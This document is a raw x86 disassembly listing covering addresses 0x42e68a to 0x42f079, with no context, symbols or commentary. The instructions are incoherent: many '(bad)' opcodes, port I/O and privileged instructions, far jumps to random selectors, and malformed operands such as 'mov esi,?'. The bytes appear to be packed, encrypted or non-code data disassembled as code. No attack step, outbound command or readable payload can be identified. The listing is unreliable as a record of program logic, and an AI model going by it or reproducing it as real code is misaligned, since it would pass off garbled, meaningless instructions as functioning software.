  42e68a:	pop    eax
  42e68b:	cwde   
  42e68c:	(bad)  
  42e68e:	cmc    
  42e68f:	mov    dh,0x62
  42e691:	or     DWORD PTR [edx-0x33],edi
  42e694:	pop    ss
  42e695:	inc    ebx
  42e696:	pop    edi
  42e697:	pushf  
  42e698:	pop    eax
  42e699:	or     esp,esi
  42e69b:	stc    
  42e69c:	pop    eax
  42e69d:	into   
  42e69e:	push   edi
  42e69f:	mov    ebx,0x94237a0c
  42e6a4:	push   edx
  42e6a5:	loop   0x42e6bd
  42e6a7:	enter  0x8c45,0x65
  42e6ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6ac:	add    eax,0x24850545
  42e6b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e6b2:	push   esi
  42e6b3:	sub    DWORD PTR ds:0x2ace01e6,eax
  42e6b9:	in     al,dx
  42e6ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e6bb:	stos   BYTE PTR es:[edi],al
  42e6bc:	idiv   BYTE PTR ds:0x8f5e7d79
  42e6c2:	adc    BYTE PTR [edx],0xd0
  42e6c5:	into   
  42e6c6:	jno    0x42e6f1
  42e6c8:	dec    ebx
  42e6c9:	hlt    
  42e6ca:	test   eax,0x29d14e83
  42e6cf:	repz push edi
  42e6d1:	jno    0x42e67a
  42e6d3:	adc    eax,0xdce442a3
  42e6d8:	in     al,0x8c
  42e6da:	jle    0x42e74e
  42e6dc:	push   cs
  42e6dd:	jle    0x42e6e7
  42e6df:	leave  
  42e6e0:	mov    edx,0x6120eadb
  42e6e5:	sub    al,0xf
  42e6e7:	iret   
  42e6e8:	xor    BYTE PTR [esi-0x3],ch
  42e6eb:	clc    
  42e6ec:	push   ecx
  42e6ed:	retf   
  42e6ee:	(bad)  
  42e6f0:	pop    ds
  42e6f1:	inc    esi
  42e6f2:	adc    al,0x10
  42e6f4:	inc    ecx
  42e6f5:	ss cmp eax,0x52f70ad6
  42e6fb:	pop    ss
  42e6fc:	mov    BYTE PTR [ebx+0x31],ch
  42e6ff:	rcl    BYTE PTR [eax-0x6f990372],0x91
  42e706:	nop
  42e707:	jmp    0x5470:0xfc49de9f
  42e70e:	call   0x42e805
	...
  42e773:	add    BYTE PTR [edx+0x39],bl
  42e776:	dec    esi
  42e777:	sub    eax,0x7f7b7f6f
  42e77c:	sub    BYTE PTR fs:[esi],cl
  42e77f:	ficomp DWORD PTR [edi]
  42e781:	add    ah,BYTE PTR [ecx+ebp*1+0x1f148]
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	das    
  42e78d:	adc    edx,DWORD PTR [ebx-0x3]
  42e790:	inc    ebp
  42e791:	sbb    DWORD PTR [edi],eax
  42e793:	xor    BYTE PTR [esp+ecx*4-0x3f],cl
  42e797:	js     0x42e773
  42e799:	les    esi,FWORD PTR ds:0xb691c102
  42e79f:	push   ecx
  42e7a0:	dec    ebx
  42e7a1:	adc    bl,BYTE PTR [bp-0x26]
  42e7a5:	call   DWORD PTR [edi]
  42e7a7:	xchg   ebx,ebx
  42e7a9:	or     BYTE PTR [eax+0x56],ch
  42e7ac:	jecxz  0x42e77c
  42e7ae:	fst    QWORD PTR [esp+ecx*4]
  42e7b1:	or     eax,0x6854a82
  42e7b6:	(bad)  
  42e7b7:	jmp    0x19ab:0xde8094b3
  42e7be:	xchg   esp,eax
  42e7bf:	cmp    ah,BYTE PTR [eax]
  42e7c1:	push   edx
  42e7c2:	mov    ds:0xacc79c59,eax
  42e7c7:	push   esi
  42e7c8:	stos   BYTE PTR es:[edi],al
  42e7c9:	mov    esi,?
  42e7cb:	mov    edx,0xa1c4c6a
  42e7d0:	daa    
  42e7d1:	cdq    
  42e7d2:	pop    ecx
  42e7d3:	mov    ss,WORD PTR [eax-0x2]
  42e7d6:	es pop edi
  42e7d8:	neg    BYTE PTR gs:[esi+0x3f2d3c76]
  42e7df:	dec    edi
  42e7e0:	sbb    edx,edi
  42e7e2:	rcr    DWORD PTR [edi],1
  42e7e4:	add    DWORD PTR [eax-0x787ebe0],esp
  42e7ea:	lods   eax,DWORD PTR ds:[esi]
  42e7eb:	(bad)  
  42e7ec:	jbe    0x42e7d2
  42e7ee:	repnz and bl,BYTE PTR cs:[esi+eax*4]
  42e7f3:	fidiv  WORD PTR [eax]
  42e7f5:	push   ds
  42e7f6:	dec    ebx
  42e7f7:	dec    edx
  42e7f8:	std    
  42e7f9:	int3   
  42e7fa:	(bad)  
  42e7fb:	arpl   WORD PTR [ebx+edx*4],cx
  42e7fe:	xor    eax,0x25e0bd2a
  42e803:	std    
  42e804:	pop    eax
  42e805:	test   BYTE PTR [ecx+0x1adc36d1],bl
  42e80b:	mov    edx,0xe8730833
  42e810:	mov    esi,0x581ea1a
  42e815:	adc    al,0x19
  42e817:	bnd jne 0x42e7eb
  42e81a:	xchg   esp,eax
  42e81b:	dec    esi
  42e81c:	mov    ecx,0x9b6e0bea
  42e821:	into   
  42e822:	fwait
  42e823:	enter  0x87c4,0x1c
  42e827:	ins    DWORD PTR es:[edi],dx
  42e828:	loop   0x42e83c
  42e82a:	repnz dec edx
  42e82c:	sbb    bh,ah
  42e82e:	xchg   esp,eax
  42e82f:	rol    DWORD PTR ds:0xaf750e05,1
  42e835:	(bad)  
  42e836:	fdivr  QWORD PTR [ecx+0x5f]
  42e839:	xor    dl,BYTE PTR [edx]
  42e83b:	xor    al,0xd6
  42e83d:	mov    esp,0x8ffd148d
  42e842:	loopne 0x42e8a1
  42e844:	(bad)  
  42e846:	xlat   BYTE PTR ds:[ebx]
  42e847:	jge    0x42e869
  42e849:	sub    BYTE PTR [ebp+ebp*1-0x2ac03ab5],bl
  42e850:	or     ah,bh
  42e852:	dec    esi
  42e853:	and    dl,al
  42e855:	fs jecxz 0x42e80d
  42e858:	stos   DWORD PTR es:[edi],eax
  42e859:	daa    
  42e85a:	in     eax,0x82
  42e85c:	adc    eax,0x3a29e157
  42e861:	pop    eax
  42e862:	or     dl,BYTE PTR [edi-0x2f]
  42e865:	xchg   ebx,eax
  42e866:	cwde   
  42e867:	or     al,0x2a
  42e869:	and    esi,ebp
  42e86b:	push   ds
  42e86c:	mov    al,ds:0x30d120ea
  42e871:	dec    edx
  42e872:	xor    ch,BYTE PTR [esi-0x46]
  42e875:	and    DWORD PTR ss:[edx],esi
  42e878:	dec    eax
  42e879:	rcr    DWORD PTR [edx-0x25],cl
  42e87c:	iret   
  42e87d:	out    dx,al
  42e87e:	jo     0x42e8c3
  42e880:	add    bl,dh
  42e882:	mov    WORD PTR [ebx+0x34],gs
  42e885:	ds adc eax,eax
  42e888:	lahf   
  42e889:	xor    DWORD PTR [ecx+0x34],ebx
  42e88c:	or     eax,DWORD PTR [esi-0x24]
  42e88f:	mov    ds:0x0,al
	...
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x5f23f82b]
  42e901:	in     al,dx
  42e902:	sbb    eax,0x1f24cba
  42e907:	add    BYTE PTR [ecx+eax*1],al
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	cs (bad) 
  42e90f:	jno    0x42e931
  42e911:	ins    BYTE PTR es:[edi],dx
  42e912:	mov    esi,0x1ffb898f
  42e917:	imul   ebp,esi,0x65
  42e91a:	inc    edx
  42e91b:	mov    eax,ds:0x3a05133
  42e920:	adc    al,0xbe
  42e922:	nop
  42e923:	push   cs
  42e924:	sbb    bl,BYTE PTR [esi]
  42e926:	addr16 clc 
  42e928:	mov    cs,ecx
  42e92a:	xchg   ebp,eax
  42e92b:	xchg   ebp,eax
  42e92c:	adc    edi,DWORD PTR [eax+0x7e1064cd]
  42e932:	jle    0x42e93f
  42e934:	cmp    al,0xea
  42e936:	sti    
  42e937:	jb     0x42e979
  42e939:	rcr    BYTE PTR [esi],0xa6
  42e93c:	fadd   QWORD PTR [ebp-0x24]
  42e93f:	jmp    0x42e97b
  42e941:	xchg   edi,eax
  42e942:	jnp    0x42e8db
  42e944:	push   ebx
  42e945:	adc    eax,0x2a2f02e1
  42e94a:	ss and esi,edx
  42e94d:	loopne 0x42e9b4
  42e94f:	and    DWORD PTR [edi+0x1411fd91],edx
  42e955:	or     BYTE PTR [ebp-0x1c64a706],0xe4
  42e95c:	cmp    BYTE PTR [eax-0x2f],ah
  42e95f:	mov    eax,0xec90dc7
  42e964:	adc    dl,BYTE PTR [ebx]
  42e966:	mov    eax,ds:0x6770ece7
  42e96b:	or     eax,0xebdfe90c
  42e970:	call   0x1796:0x3d2be05e
  42e977:	inc    edi
  42e978:	dec    edi
  42e979:	call   0x49c5:0x6122b751
  42e980:	push   cs
  42e981:	sar    BYTE PTR [ebx-0x2b0b363d],cl
  42e987:	jl     0x42e914
  42e989:	xchg   edi,eax
  42e98a:	jg     0x42e990
  42e98c:	jno    0x42e991
  42e98e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e98f:	mov    cl,0x87
  42e991:	and    cl,BYTE PTR [ecx]
  42e993:	jle    0x42e962
  42e995:	cli    
  42e996:	mov    ebp,esi
  42e998:	mov    ecx,0x7c8da003
  42e99d:	push   ds
  42e99e:	out    0x3e,al
  42e9a0:	push   ds
  42e9a1:	pop    esi
  42e9a2:	scas   al,BYTE PTR es:[edi]
  42e9a3:	rcl    BYTE PTR [esi],0x9
  42e9a6:	sbb    eax,0xe9370e07
  42e9ab:	xor    ebp,DWORD PTR [esi+0x1cfbb434]
  42e9b1:	pop    esi
  42e9b2:	aaa    
  42e9b3:	mov    esp,0x3820c853
  42e9b8:	mov    edi,0x1c679447
  42e9bd:	in     al,0xeb
  42e9bf:	stc    
  42e9c0:	add    BYTE PTR [esp+ebp*2+0x26ebc0ce],ah
  42e9c7:	fst    DWORD PTR [ebx]
  42e9c9:	mov    ch,0x3e
  42e9cb:	pop    eax
  42e9cc:	gs sub eax,0x29736fd5
  42e9d2:	jle    0x42e9c1
  42e9d4:	repnz sub eax,0x1b1afc56
  42e9da:	pop    edi
  42e9db:	jb     0x42ea0c
  42e9dd:	mov    edi,0xa43e83cd
  42e9e2:	into   
  42e9e3:	push   esi
  42e9e4:	icebp  
  42e9e5:	ds add al,0x69
  42e9e8:	shl    BYTE PTR [ecx-0x28],cl
  42e9eb:	imul   esp,DWORD PTR [ecx+0x40fdd79f],0x67
  42e9f2:	fs xchg edi,eax
  42e9f4:	jne    0x42ea31
  42e9f6:	adc    eax,0xc697a00b
  42e9fb:	and    dl,cl
  42e9fd:	mov    al,ds:0x66b3ac5e
  42ea02:	jnp    0x42e9be
  42ea04:	mov    ebx,0xe0f5cf0f
  42ea09:	mov    eax,ds:0xeba51caf
  42ea0e:	xchg   ebx,eax
  42ea0f:	in     eax,dx
	...
  42ea74:	in     eax,0xba
  42ea76:	xchg   edx,eax
  42ea77:	jecxz  0x42ea58
  42ea79:	jmp    0x42ea70
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	fwait
  42ea81:	aaa    
  42ea82:	cld    
  42ea83:	and    BYTE PTR [eax-0xd],dl
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    al,0x1
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	sub    ecx,ebp
  42ea8e:	dec    ecx
  42ea8f:	rcl    BYTE PTR [edx-0x611d5701],0xee
  42ea96:	pop    ss
  42ea97:	pop    edx
  42ea98:	fucom  st(7)
  42ea9a:	push   edi
  42ea9b:	jmp    0xcf792954
  42eaa0:	enter  0xb57b,0x30
  42eaa4:	mov    ah,0x40
  42eaa6:	pop    es
  42eaa7:	iret   
  42eaa8:	lahf   
  42eaa9:	arpl   dx,ax
  42eaab:	js     0x42ead7
  42eaad:	addr16 aaa 
  42eaaf:	cs pop ebx
  42eab1:	loop   0x42ea37
  42eab3:	xchg   esp,eax
  42eab4:	rcl    bl,0x82
  42eab7:	inc    ebp
  42eab8:	(bad)  
  42eab9:	jns    0x42ea9b
  42eabb:	cli    
  42eabc:	les    eax,FWORD PTR [ebp-0x754c7e93]
  42eac2:	pop    es
  42eac3:	lds    ebx,FWORD PTR [edi-0x52f4514c]
  42eac9:	sub    eax,0x44165276
  42eace:	and    al,0xbc
  42ead0:	sbb    eax,0x89b7e645
  42ead5:	iret   
  42ead6:	jae    0x42eb4f
  42ead8:	pusha  
  42ead9:	cwde   
  42eada:	dec    ebx
  42eadb:	dec    esp
  42eadc:	jge    0x42eae5
  42eade:	cs in  eax,dx
  42eae0:	jb     0x42ea6a
  42eae2:	pop    ecx
  42eae3:	and    DWORD PTR [edi],eax
  42eae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eae6:	sub    al,0x7b
  42eae8:	fmul   st,st(7)
  42eaea:	mov    BYTE PTR [edx-0x25],dh
  42eaed:	aad    0xda
  42eaef:	pop    eax
  42eaf0:	aaa    
  42eaf1:	push   ds
  42eaf2:	and    BYTE PTR [edx-0x2a859717],bh
  42eaf8:	fs lahf 
  42eafa:	xchg   edx,eax
  42eafb:	push   ds
  42eafc:	push   ss
  42eafd:	inc    ebx
  42eafe:	sub    dl,BYTE PTR [edi+edi*1+0x1d3e1b83]
  42eb05:	add    eax,0xfa1a23ab
  42eb0a:	sub    edi,DWORD PTR [eax]
  42eb0c:	jle    0x42eaaf
  42eb0e:	ins    BYTE PTR es:[edi],dx
  42eb0f:	bound  eax,QWORD PTR [edx+0x18]
  42eb12:	xchg   ebx,eax
  42eb13:	push   0x30
  42eb15:	mov    ebx,0x86d26cb9
  42eb1a:	xchg   edx,eax
  42eb1b:	pop    es
  42eb1c:	lahf   
  42eb1d:	push   es
  42eb1e:	adc    eax,0xe81d4319
  42eb23:	xchg   ecx,eax
  42eb24:	(bad)  
  42eb25:	(bad)  
  42eb27:	or     DWORD PTR [eax-0x31ce7638],edi
  42eb2d:	sti    
  42eb2e:	adc    ebp,edx
  42eb30:	xor    edi,0x9caf216d
  42eb36:	xor    eax,0x33bbf1fc
  42eb3b:	mov    esi,0x5f6f4713
  42eb40:	pop    ss
  42eb41:	inc    esi
  42eb42:	arpl   WORD PTR es:[ebx],ax
  42eb45:	add    BYTE PTR [edi],al
  42eb47:	xor    dl,dh
  42eb49:	and    ebx,esp
  42eb4b:	or     DWORD PTR [ebp-0x5c],esi
  42eb4e:	stos   BYTE PTR es:[edi],al
  42eb4f:	jnp    0x42eb58
  42eb51:	out    0xb3,al
  42eb53:	nop
  42eb54:	xor    ebp,DWORD PTR [eax+ebp*8+0x1a]
  42eb58:	cmp    bh,dl
  42eb5a:	scas   al,BYTE PTR es:[edi]
  42eb5b:	jno    0x42ebd9
  42eb5d:	loopne 0x42eaef
  42eb5f:	pushf  
  42eb60:	sti    
  42eb61:	sbb    eax,0x76b03d74
  42eb66:	mov    DWORD PTR [edi-0x3],eax
  42eb69:	sub    bh,dh
  42eb6b:	cwde   
  42eb6c:	lods   al,BYTE PTR ds:[esi]
  42eb6d:	cmp    eax,0xf307ecf1
  42eb72:	inc    edx
  42eb73:	xchg   BYTE PTR [ebp-0x1a],cl
  42eb76:	jge    0x42eb07
  42eb78:	inc    ebx
  42eb79:	mov    eax,0x485b2982
  42eb7e:	mov    DWORD PTR [esi],esp
  42eb80:	xchg   BYTE PTR [eax+0x84609ee],bl
  42eb86:	mov    edx,0x6807aa24
  42eb8b:	dec    DWORD PTR [edi+0x72]
  42eb8e:	(bad)  
  42eb8f:	rol    BYTE PTR [eax],cl
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	or     DWORD PTR [ebp+ebx*2-0xbabb3b6],0x1040001
  42ec0a:	add    BYTE PTR [eax],al
  42ec0c:	(bad)  
  42ec0d:	mov    eax,ds:0x37cff0fe
  42ec12:	and    edi,DWORD PTR [ecx+0x41]
  42ec15:	mov    DWORD PTR [edx+0x2b5054eb],ecx
  42ec1b:	cvttps2pi mm4,QWORD PTR [ebp+0x49a6962b]
  42ec22:	fdiv   DWORD PTR [ebx-0x1a]
  42ec25:	mov    eax,0x3d17a1ad
  42ec2a:	aaa    
  42ec2b:	jbe    0x42ebe4
  42ec2d:	pop    esi
  42ec2e:	pushf  
  42ec2f:	(bad)  
  42ec31:	pusha  
  42ec32:	aaa    
  42ec33:	sbb    esp,esi
  42ec35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec36:	push   eax
  42ec37:	sub    cl,BYTE PTR [eax-0xb]
  42ec3a:	leave  
  42ec3b:	jmp    0x42ec5c
  42ec3d:	or     al,0xfe
  42ec3f:	addr16 test ch,0x17
  42ec43:	daa    
  42ec44:	push   ss
  42ec45:	push   ebp
  42ec46:	or     BYTE PTR [ebp+0x4d],bh
  42ec49:	pop    esi
  42ec4a:	fild   DWORD PTR [esp+eiz*8+0x7b]
  42ec4e:	out    dx,al
  42ec4f:	div    ebp
  42ec51:	fdivr  st,st(3)
  42ec53:	add    BYTE PTR [ebx-0x139bda49],bl
  42ec59:	push   ebp
  42ec5a:	out    dx,al
  42ec5b:	pushf  
  42ec5c:	xor    DWORD PTR ds:0xb45f7b57,ecx
  42ec62:	fadd   QWORD PTR [ebp-0x496372bb]
  42ec68:	leave  
  42ec69:	jl     0x42ece6
  42ec6b:	cmp    ah,cl
  42ec6d:	sbb    DWORD PTR [eax+0x70],ecx
  42ec70:	pop    esp
  42ec71:	xlat   BYTE PTR ds:[ebx]
  42ec72:	stc    
  42ec73:	jge    0x42ecb4
  42ec75:	jne    0x42ecc9
  42ec77:	mov    esp,0xc7a55b44
  42ec7c:	dec    edi
  42ec7d:	and    ecx,ebp
  42ec7f:	aam    0x16
  42ec81:	dec    BYTE PTR [ebp+0x390f2280]
  42ec87:	or     DWORD PTR [edi],0x49247c3d
  42ec8d:	loopne 0x42ed0a
  42ec8f:	out    dx,al
  42ec90:	inc    esp
  42ec91:	ja     0x42ecd0
  42ec93:	lea    ebx,[esi]
  42ec95:	out    dx,eax
  42ec96:	dec    edx
  42ec97:	xor    dl,al
  42ec99:	jne    0x42ec95
  42ec9b:	and    BYTE PTR [ebx-0x5],cl
  42ec9e:	es cmp eax,0x9f4f11c4
  42eca4:	cmp    al,0x42
  42eca6:	dec    edx
  42eca7:	push   esi
  42eca8:	mov    ds:0x5ba7411f,al
  42ecad:	aad    0x74
  42ecaf:	pop    ebp
  42ecb0:	cmp    al,ah
  42ecb2:	xor    DWORD PTR [edx],esi
  42ecb4:	mov    eax,ds:0x502b18de
  42ecb9:	push   edi
  42ecba:	cmp    BYTE PTR [ecx-0x26],dl
  42ecbd:	add    eax,DWORD PTR [ecx-0x7f]
  42ecc0:	arpl   WORD PTR [eax],di
  42ecc2:	daa    
  42ecc3:	mov    bh,0x45
  42ecc5:	ret    0x9355
  42ecc8:	outs   dx,BYTE PTR ds:[esi]
  42ecc9:	jno    0x42ece9
  42eccb:	xor    bl,BYTE PTR [ecx-0x3f]
  42ecce:	fdiv   QWORD PTR [edx+0x4f3c0fd2]
  42ecd4:	(bad)  
  42ecd6:	jbe    0x42ed37
  42ecd8:	xor    BYTE PTR [edx-0x2b80d94d],cl
  42ecde:	ds lock inc edi
  42ece1:	lods   al,BYTE PTR ds:[esi]
  42ece2:	out    dx,al
  42ece3:	test   BYTE PTR [esi-0x1c],bl
  42ece6:	fnstsw WORD PTR [edi+0x6b]
  42ece9:	push   edi
  42ecea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eceb:	jg     0x42ece2
  42eced:	out    dx,al
  42ecee:	jp     0x42ed07
  42ecf0:	push   edi
  42ecf1:	mov    edx,0xe0ad9508
  42ecf6:	out    dx,eax
  42ecf7:	cwde   
  42ecf8:	imul   ecx,esi,0x70
  42ecfb:	loop   0x42ed57
  42ecfd:	cmp    DWORD PTR [eax+eax*1-0x167c67d5],esi
  42ed04:	pop    ebx
  42ed05:	lds    ebp,FWORD PTR [ecx]
  42ed07:	add    BYTE PTR [edx],dh
  42ed09:	xor    DWORD PTR [eax-0x4d2cacb8],0xa
	...
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp+0x2dbf67a2]
  42ed83:	mov    ds:0x1f558,eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	in     eax,0x5f
  42ed8e:	test   eax,0x1ee24c70
  42ed93:	mov    dl,0x75
  42ed95:	int    0xe1
  42ed97:	pushf  
  42ed98:	push   esi
  42ed99:	in     eax,0x54
  42ed9b:	ins    DWORD PTR es:[edi],dx
  42ed9c:	call   FWORD PTR [ebx]
  42ed9e:	aam    0x7a
  42eda0:	dec    edi
  42eda1:	and    al,0x13
  42eda3:	pushf  
  42eda4:	mov    eax,ds:0x21ee2d57
  42eda9:	push   ebx
  42edaa:	test   BYTE PTR [esi+0x6e],0x49
  42edae:	sub    al,0x1a
  42edb0:	jbe    0x42ed38
  42edb2:	aad    0x41
  42edb4:	or     ah,dl
  42edb6:	push   ebx
  42edb7:	cwde   
  42edb8:	jp     0x42ee31
  42edba:	add    ebp,edi
  42edbc:	fwait
  42edbd:	(bad)  
  42edbe:	scas   al,BYTE PTR es:[edi]
  42edbf:	or     ah,ah
  42edc1:	cld    
  42edc2:	pusha  
  42edc3:	test   BYTE PTR [eax+0x3b48c456],dl
  42edc9:	arpl   WORD PTR [eax],sp
  42edcb:	test   DWORD PTR [eax+0x56],esi
  42edce:	xor    eax,0xdb355390
  42edd3:	stos   DWORD PTR es:[edi],eax
  42edd4:	bnd ja 0x42ed59
  42edd7:	inc    esp
  42edd8:	fcom   DWORD PTR [ebx+0x4ccc5a26]
  42edde:	push   ds
  42eddf:	jge    0x42ee5d
  42ede1:	sbb    eax,0x2c786491
  42ede6:	(bad)  
  42ede7:	loopne 0x42ede4
  42ede9:	mov    bl,0x77
  42edeb:	pop    esp
  42edec:	dec    ebx
  42eded:	inc    ebx
  42edee:	push   ds
  42edef:	ins    BYTE PTR es:[edi],dx
  42edf0:	ja     0x42ede9
  42edf2:	ret    
  42edf3:	xor    eax,0x19590448
  42edf8:	inc    eax
  42edf9:	call   0xa7d3:0x6408867f
  42ee00:	push   ss
  42ee01:	loopne 0x42edb8
  42ee03:	cli    
  42ee04:	xchg   DWORD PTR [ebp+ebp*4+0x3bf9c8f3],esi
  42ee0b:	out    0xcf,eax
  42ee0d:	xlat   BYTE PTR ds:[ebx]
  42ee0e:	xor    eax,DWORD PTR [ecx]
  42ee10:	ror    BYTE PTR [ebp-0x54],cl
  42ee13:	lods   eax,DWORD PTR ds:[esi]
  42ee14:	rcr    BYTE PTR [esi+0x50],1
  42ee17:	loopne 0x42ee6b
  42ee19:	xor    eax,0x46b40b35
  42ee1e:	(bad)  
  42ee1f:	(bad)  
  42ee20:	push   edi
  42ee21:	out    dx,eax
  42ee22:	loop   0x42ee35
  42ee24:	or     BYTE PTR [ebp-0x550d2ae],cl
  42ee2a:	xor    DWORD PTR [esi-0x23e47266],0xffffff80
  42ee31:	sbb    BYTE PTR [edi+esi*8+0x20],dl
  42ee35:	xor    BYTE PTR [ebx-0x6435c2b5],dl
  42ee3b:	cli    
  42ee3c:	imul   ebp,DWORD PTR [esi+0x7bbf560a],0xa9a9860b
  42ee46:	pop    edx
  42ee47:	or     eax,0x2d01e432
  42ee4c:	push   esp
  42ee4d:	add    BYTE PTR [esi+ebx*2+0x6f8a2063],ch
  42ee54:	adc    al,0xed
  42ee56:	and    cl,bl
  42ee58:	push   esp
  42ee59:	xchg   ebp,eax
  42ee5a:	add    esi,DWORD PTR [edi+0x7b]
  42ee5d:	or     eax,0x3464e095
  42ee62:	jb     0x42eed7
  42ee64:	mov    dh,BYTE PTR [edx-0x4]
  42ee67:	xor    al,0x6c
  42ee69:	mov    edx,0xcb3de909
  42ee6e:	scas   al,BYTE PTR es:[edi]
  42ee6f:	adc    BYTE PTR [ebx+0x26f6b55b],0xec
  42ee76:	and    ch,cl
  42ee78:	add    cl,ah
  42ee7a:	arpl   WORD PTR [edi],ax
  42ee7c:	pop    edi
  42ee7d:	mov    BYTE PTR [ecx],bl
  42ee7f:	arpl   WORD PTR [ecx],di
  42ee81:	leave  
  42ee82:	xlat   BYTE PTR ds:[ebx]
  42ee83:	stos   BYTE PTR es:[edi],al
  42ee84:	mov    ah,0x35
  42ee86:	sbb    al,0xb9
  42ee88:	mov    esp,esi
  42ee8a:	xor    BYTE PTR [esi-0x30571698],0x0
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	shl    DWORD PTR [esi],cl
  42ef02:	(bad)  
  42ef03:	jnp    0x42ef61
  42ef05:	test   BYTE PTR [ecx],0x0
  42ef08:	add    al,0x1
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	rol    DWORD PTR gs:[ebx-0x27],1
  42ef10:	xchg   BYTE PTR [esi],dl
  42ef12:	jb     0x42eee3
  42ef14:	cdq    
  42ef15:	aad    0x57
  42ef17:	mov    eax,ds:0x7939196
  42ef1c:	mov    BYTE PTR [eax-0x63],cl
  42ef1f:	ret    
  42ef20:	inc    ebx
  42ef21:	push   ds
  42ef22:	popa   
  42ef23:	or     esp,ebx
  42ef25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef26:	in     al,dx
  42ef27:	popa   
  42ef28:	test   al,0x48
  42ef2a:	pop    ss
  42ef2b:	mov    al,0x68
  42ef2d:	pop    edx
  42ef2e:	pushf  
  42ef2f:	pop    ecx
  42ef30:	jae    0x42eed7
  42ef32:	sahf   
  42ef33:	and    ebp,DWORD PTR [edx]
  42ef35:	xor    ch,dh
  42ef37:	xor    BYTE PTR [edi],dl
  42ef39:	mov    es,WORD PTR ds:0x738c9254
  42ef3f:	xchg   esp,eax
  42ef40:	mov    edx,0x48e8f33e
  42ef45:	shl    bl,cl
  42ef47:	cmp    al,0xd0
  42ef49:	mov    ?,WORD PTR [edx+0x20fad906]
  42ef4f:	cmp    BYTE PTR [ecx],dl
  42ef51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef52:	jecxz  0x42ef35
  42ef54:	scas   eax,DWORD PTR es:[edi]
  42ef55:	inc    eax
  42ef56:	lods   eax,DWORD PTR ds:[esi]
  42ef57:	adc    DWORD PTR [edi-0x3f],0xffffffca
  42ef5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef5c:	mov    bh,0x2e
  42ef5e:	lock repnz daa 
  42ef61:	aad    0xa1
  42ef63:	cmovae ebp,DWORD PTR [edi-0x733bf26c]
  42ef6a:	cwde   
  42ef6b:	xor    eax,0x524b59f9
  42ef70:	lahf   
  42ef71:	ds test eax,0x3519fc8c
  42ef77:	mov    ebp,edi
  42ef79:	fwait
  42ef7a:	push   cs
  42ef7b:	add    al,0xa7
  42ef7d:	or     BYTE PTR [edx],dh
  42ef7f:	stc    
  42ef80:	dec    esi
  42ef81:	push   edx
  42ef82:	mov    ch,0xca
  42ef84:	add    BYTE PTR [ebp+0x23],cl
  42ef87:	pop    esi
  42ef88:	popa   
  42ef89:	push   edi
  42ef8a:	xchg   ecx,eax
  42ef8b:	jecxz  0x42ef11
  42ef8d:	fucomip st,st(4)
  42ef8f:	mov    ebp,0x987035a3
  42ef94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef95:	or     BYTE PTR ds:0x72f76930,dl
  42ef9b:	retf   0xe04b
  42ef9e:	mov    ds:0xf372b58c,eax
  42efa3:	(bad)  
  42efa5:	wbinvd 
  42efa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efa8:	mov    ebp,0x23a17408
  42efad:	ins    BYTE PTR es:[edi],dx
  42efae:	mov    ch,0xbc
  42efb0:	ins    BYTE PTR es:[edi],dx
  42efb1:	push   es
  42efb2:	loope  0x42efc2
  42efb4:	cmp    bl,BYTE PTR [ecx+0x51]
  42efb7:	push   edx
  42efb8:	test   DWORD PTR [esi],eax
  42efba:	fwait
  42efbb:	mov    eax,ds:0x631f8665
  42efc0:	fst    DWORD PTR [ebx+0x59]
  42efc3:	sti    
  42efc4:	cmc    
  42efc5:	scas   al,BYTE PTR es:[edi]
  42efc6:	cli    
  42efc7:	mov    ebx,0x94253f65
  42efcc:	dec    edx
  42efcd:	lds    eax,FWORD PTR [eax]
  42efcf:	fcomp  QWORD PTR [eax+ecx*1-0x27e93b20]
  42efd6:	inc    edi
  42efd7:	mov    eax,DWORD PTR [eax+ebp*8]
  42efda:	daa    
  42efdb:	xor    dh,bh
  42efdd:	test   edx,ebp
  42efdf:	mov    eax,ds:0x9c63ca0c
  42efe4:	ficomp DWORD PTR [edi+0x133566a2]
  42efea:	push   ss
  42efeb:	dec    edi
  42efec:	push   eax
  42efed:	jne    0x42efde
  42efef:	mov    ecx,0x38d412d7
  42eff4:	call   0xd678:0x509ec267
  42effb:	jb     0x42ef98
  42effd:	or     al,0xd2
  42efff:	and    al,0xb5
  42f001:	push   edi
  42f002:	daa    
  42f003:	(bad)  
  42f004:	enter  0xb17c,0x35
  42f008:	and    bl,ch
  42f00a:	cmp    edx,eax
  42f00c:	xor    BYTE PTR ss:[ebx+0x52],al
	...
  42f073:	add    BYTE PTR [edx],dl
  42f075:	ds int 0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
